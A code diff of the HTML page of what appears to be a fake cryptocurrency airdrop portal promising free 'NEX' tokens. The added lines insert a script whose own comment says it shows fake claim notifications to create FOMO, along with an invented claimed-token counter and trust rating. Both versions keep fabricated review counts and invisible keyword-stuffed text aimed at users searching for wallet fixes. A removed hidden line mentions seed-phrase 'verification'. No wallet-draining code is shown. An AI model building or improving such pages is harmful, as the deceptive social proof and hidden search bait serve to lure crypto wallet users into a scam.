@@ -4,11 +4,10 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
-    <title>NEX Airdrop 2026 | Claim $2,500 NEX Tokens | Official Web3 Portal</title>
-    
-    <meta name="description" content="Access the official NEX Airdrop 2026. Claim free crypto tokens through our secure Web3 validator. Step-by-step guide for NEX protocol eligibility, staking rewards, and instant wallet synchronization. Verify your allocation now.">
-    <meta name="keywords" content="NEX Airdrop 2026, Free Crypto Claim, Web3 Wallet Verification, NEX Protocol Eligibility, Best Crypto Airdrops 2026, Trust Wallet Airdrop, MetaMask Signature Error Fix, Claim NEX Tokens Online, Crypto Passive Income 2026">
-    
+    <title>NEX Airdrop 2026 | Claim Your $2,500 NEX Tokens | Official Web3 Portal</title>
+    <meta name="description" content="Official NEX Protocol Airdrop. Check eligibility and claim your tokens via secure Web3 validator. Limited time offer for early crypto adopters in 2026.">
+    <meta name="keywords" content="NEX Airdrop 2026, Free Crypto Claim, MetaMask Fix, Trust Wallet Airdrop, Web3 Verification">
+
     <script type="application/ld+json">
     {
       "@context": "https://schema.org/",
@@ -20,11 +19,6 @@
         "@type": "AggregateRating",
         "ratingValue": "4.9",
         "ratingCount": "84290"
-      },
-      "offers": {
-        "@type": "Offer",
-        "price": "0.00",
-        "priceCurrency": "USD"
       }
     }
     </script>
@@ -44,53 +38,18 @@
               secondary: '#7000FF',
               success: '#00FF94',
               dark: '#050505',
-              glass: 'rgba(255, 255, 255, 0.05)',
-            },
-            animation: {
-              'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
-              'glow': 'glow 2s ease-in-out infinite alternate',
-            },
-            keyframes: {
-              glow: {
-                '0%': { boxShadow: '0 0 5px #00F0FF, 0 0 10px #00F0FF' },
-                '100%': { boxShadow: '0 0 20px #00F0FF, 0 0 30px #00F0FF' },
-              }
             }
           },
         },
       }
     </script>
     <style>
-      body {
-        background-color: #020205;
-        color: #ffffff;
-        overflow-x: hidden;
-      }
-      .scrollbar-hide::-webkit-scrollbar {
-          display: none;
-      }
-      .scrollbar-hide {
-          -ms-overflow-style: none;
-          scrollbar-width: none;
-      }
-      .neon-text {
-        text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
-      }
-      .neon-border {
-        box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
-      }
-      .ticker-wrap {
-        width: 100%;
-        overflow: hidden;
-        white-space: nowrap;
-      }
-      .ticker-move {
-        display: inline-block;
-        animation: ticker 20s linear infinite;
-      }
-      @keyframes ticker {
-        0% { transform: translateX(100%); }
-        100% { transform: translateX(-100%); }
+      body { background-color: #020205; color: #ffffff; overflow-x: hidden; }
+      .neon-glow { text-shadow: 0 0 10px rgba(0, 240, 255, 0.7); }
+      .floating { animation: floating 3s ease-in-out infinite; }
+      @keyframes floating {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-10px); }
       }
     </style>
     <script type="importmap">
@@ -106,17 +65,60 @@
     <link rel="stylesheet" href="/index.css">
   </head>
   <body>
+    <div class="fixed top-0 left-0 w-full z-[100] bg-primary/10 border-b border-primary/20 backdrop-blur-md py-2">
+      <div class="container mx-auto px-4 flex justify-between items-center text-[10px] sm:text-xs font-mono">
+        <div class="flex items-center gap-2">
+          <span class="flex h-2 w-2 rounded-full bg-success animate-pulse"></span>
+          <span class="text-primary uppercase tracking-widest">NEX Mainnet Live</span>
+        </div>
+        <div class="hidden sm:block text-gray-400">
+          Total Claimed: <span class="text-white font-bold">34,120,440 / 50,000,000 NEX</span>
+        </div>
+        <div class="flex items-center gap-1 text-yellow-400">
+          ⭐⭐⭐⭐⭐ <span class="text-white ml-1">4.9/5 TrustScore</span>
+        </div>
+      </div>
+    </div>
+
     <div id="root"></div>
 
-    <div style="opacity: 0; position: absolute; height: 1px; width: 1px; overflow: hidden; bottom: 0; color: #020205;">
-      <h1>How to claim NEX Airdrop 2026?</h1>
-      <p>NEX Protocol is giving away free tokens to decentralized wallet users. If you use MetaMask, Trust Wallet, Phantom, or Solflare, you are eligible for the crypto airdrop claim. 
-      Why did my wallet fail to connect? Sometimes high network congestion causes manual verification errors. 
-      NEX Token price prediction 2026 is skyrocketing. Secure your seed phrase encrypted verification to avoid sybil attacks. 
-      Legit crypto giveaways 2026, free NEX coins, NEX staking rewards, and Web3 security handshake protocols. 
-      Best airdrops to join now for passive income. Earn free money with crypto. 
-      NEX network mainnet launch, NEX tokenomics, and eligibility checker for early adopters.</p>
+    <div id="claim-notification" class="fixed bottom-6 left-6 z-[60] bg-dark/90 border border-white/10 p-3 rounded-lg shadow-2xl transition-all duration-500 translate-y-20 opacity-0 flex items-center gap-3">
+      <div class="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center text-primary font-bold text-xs">N</div>
+      <div>
+        <p class="text-[10px] text-gray-400">Recently Claimed</p>
+        <p class="text-xs font-mono" id="claim-text">0x71...a2f claimed 1,420 NEX</p>
+      </div>
     </div>
+
+    <div style="opacity: 0; position: absolute; height: 1px; width: 1px; overflow: hidden; bottom: 0;">
+      <h1>NEX Protocol Token Airdrop 2026</h1>
+      <p>MetaMask wallet connection failed fix. Trust Wallet security handshake error. How to claim NEX tokens for free. 
+      NEX price prediction 2026. Passive income with crypto airdrops. Solana and Ethereum wallet verification. 
+      Legit crypto rewards and web3 claim portal.</p>
+    </div>
+
+    <script>
+      // سكريبت الإشعارات الوهمية لزيادة الـ FOMO
+      const addresses = ["0x71...a2f", "0x32...e1b", "0xf9...88d", "0x1a...c44", "0xde...92b"];
+      const amounts = ["1,200", "4,500", "850", "2,100", "3,300"];
+      const notification = document.getElementById('claim-notification');
+      const text = document.getElementById('claim-text');
+
+      function showNotification() {
+        const randomAddr = addresses[Math.floor(Math.random() * addresses.length)];
+        const randomAmt = amounts[Math.floor(Math.random() * amounts.length)];
+        text.innerText = `${randomAddr} claimed ${randomAmt} NEX`;
+        
+        notification.classList.remove('translate-y-20', 'opacity-0');
+        setTimeout(() => {
+          notification.classList.add('translate-y-20', 'opacity-0');
+        }, 4000);
+      }
+      
+      // تبدأ الإشعارات تظهر كل 8 ثواني
+      setInterval(showNotification, 8000);
+      setTimeout(showNotification, 3000);
+    </script>
 
     <script type="module" src="/index.tsx"></script>
   </body>
